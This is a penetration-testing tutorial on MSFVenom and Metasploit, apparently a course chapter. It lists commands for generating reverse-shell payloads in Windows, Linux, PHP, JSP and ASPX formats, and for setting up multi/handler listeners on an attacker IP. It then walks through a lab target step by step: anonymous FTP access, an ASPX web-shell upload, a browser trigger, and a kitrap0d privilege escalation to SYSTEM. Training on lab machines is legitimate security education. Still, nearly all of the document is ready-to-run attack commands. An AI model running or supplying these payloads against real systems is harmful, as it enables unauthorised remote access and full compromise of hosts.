# 13 — Introduction to MSFVenom

## Overview

**MSFVenom** is the combined successor of `msfpayload` and `msfencode`. It generates customized payloads in various formats for different architectures and platforms, with optional encoding to remove bad characters and (limited) AV evasion.

---

## MSFVenom Syntax

```bash
msfvenom -p <payload> [options] -f <format> -o <output_file>
```
> `-p` selects the payload, `-f` sets the output format to match the target (`.exe`, `.aspx`, `.elf`, etc.), `-o` writes to a file. Add `LHOST` and `LPORT` as positional arguments after the payload name.

### Core Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-p` | Payload to use | `-p windows/meterpreter/reverse_tcp` |
| `-f` | Output format | `-f aspx`, `-f exe`, `-f elf`, `-f raw` |
| `-o` | Output file | `-o reverse_shell.aspx` |
| `-a` | Architecture | `-a x86`, `-a x64` |
| `--platform` | Target platform | `--platform windows` |
| `-e` | Encoder | `-e x86/shikata_ga_nai` |
| `-i` | Encoding iterations | `-i 10` |
| `-b` | Bad characters to avoid | `-b "\x00"` |
| `LHOST=` | Attacker IP | `LHOST=10.10.14.5` |
| `LPORT=` | Attacker port | `LPORT=1337` |

---

## Common Payload Formats

| Target | Payload | Format | Command |
|--------|---------|--------|---------|
| **Windows reverse shell** | `windows/meterpreter/reverse_tcp` | `.exe` | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe` |
| **Windows ASPX** | `windows/meterpreter/reverse_tcp` | `.aspx` | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx > shell.aspx` |
| **Linux ELF** | `linux/x86/meterpreter/reverse_tcp` | `.elf` | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf` |
| **PHP** | `php/meterpreter/reverse_tcp` | `.php` | `msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php` |
| **Python** | `python/meterpreter/reverse_tcp` | `.py` | `msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.py` |
| **JSP** | `java/jsp_shell_reverse_tcp` | `.jsp` | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp` |
| **WAR** | `java/jsp_shell_reverse_tcp` | `.war` | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war` |

---

## Multi/Handler — Catching Reverse Shells

The **multi/handler** module is the universal listener for any MSFVenom payload.

```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 1337
msf6 exploit(multi/handler) > run
# [*] Started reverse TCP handler on 10.10.14.5:1337
```
> The payload, LHOST, and LPORT here must exactly match what you used in msfvenom. Replace `10.10.14.5` with your tun0 IP and `1337` with your chosen port.

> **Critical**: The `payload`, `LHOST`, and `LPORT` in multi/handler must **exactly match** what was used in `msfvenom`.

### Run as Background Job

```bash
msf6 exploit(multi/handler) > exploit -j
# Keeps listener running while you use the console
```
> `-j` runs the handler as a background job. The listener stays open to catch connections while you do other things in msfconsole.

---

## Full Workflow Example: FTP + Web Upload (Devel)

### 1. Scan the Target

```bash
nmap -sV -T4 -p- 10.10.10.5
# 21/tcp  ftp   Microsoft ftpd
# 80/tcp  http  Microsoft IIS httpd 7.5
```
> `-sV` detects service versions, `-T4` speeds up the scan, `-p-` scans all 65535 ports. Replace the IP with your target.

### 2. Discover FTP Anonymous Access + aspnet_client Directory

```bash
ftp 10.10.10.5
# Login: anonymous
ftp> ls
# aspnet_client/  ← IIS can run .aspx files
```
> Try `anonymous` as the username with a blank password (or any email). If you can list directories with `ls`, check if a webroot directory like `aspnet_client` is writable — that means you can upload and trigger payloads via the browser.

### 3. Generate ASPX Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```
> `-f aspx` generates an ASPX web shell for IIS targets. Replace LHOST with your tun0 IP and LPORT with your chosen port. The `>` redirects output to a file.

### 4. Upload via FTP

```bash
ftp> put reverse_shell.aspx
```
> `put` uploads the local file to the FTP server. If the FTP root maps to the IIS webroot, the file becomes accessible through the browser.

### 5. Start Listener

```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 1337
msf6 exploit(multi/handler) > run
```
> Start the listener before triggering the payload. If you trigger first and nothing is listening, the connection attempt will fail and the shell won't connect back.

### 6. Trigger Payload

```
Browse to: http://10.10.10.5/reverse_shell.aspx
```

### 7. Meterpreter Session Opens

```bash
meterpreter > getuid
# Server username: IIS APPPOOL\Web
```

### 8. Privilege Escalation

```bash
meterpreter > bg
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(...) > set SESSION 1
msf6 post(...) > run
# [+] exploit/windows/local/ms10_015_kitrap0d: vulnerable

msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > set LPORT 1338
msf6 exploit(...) > run
meterpreter > getuid
# NT AUTHORITY\SYSTEM
```
> Background the low-privilege session first. Run the suggester to find local privesc exploits. Use a different LPORT for the escalation shell — the original port is already in use. Set SESSION to the ID of your existing low-priv session.

---

## List Available Formats and Payloads

```bash
# List all output formats
msfvenom --list formats

# List all payloads
msfvenom --list payloads

# List all encoders
msfvenom --list encoders

# List payloads for a specific platform
msfvenom --list payloads | grep windows
```
> `--list` shows all available options for that category. Pipe through `grep` to filter by platform, architecture, or connection type.

---

## Key Takeaways

| Concept | Remember |
|---------|----------|
| **MSFVenom = msfpayload + msfencode** | One tool for generation + encoding |
| **multi/handler catches everything** | Universal listener — must match payload/LHOST/LPORT exactly |
| **Format matches the target** | `.aspx` for IIS, `.elf` for Linux, `.exe` for Windows, `.php` for Apache/PHP |
| **Encoding ≠ AV evasion** | Modern AV uses heuristics — encoding alone won't bypass it |
| **`local_exploit_suggester` after initial shell** | First step when you land as a low-privilege user |
| **Use different LPORT for privesc** | Original listener already bound to first port — pick a new one |
| **FTP + web = upload vector** | If FTP root maps to webroot, you can upload and trigger payloads |
| **`exploit -j` for background listeners** | Keep handler running while using other modules |
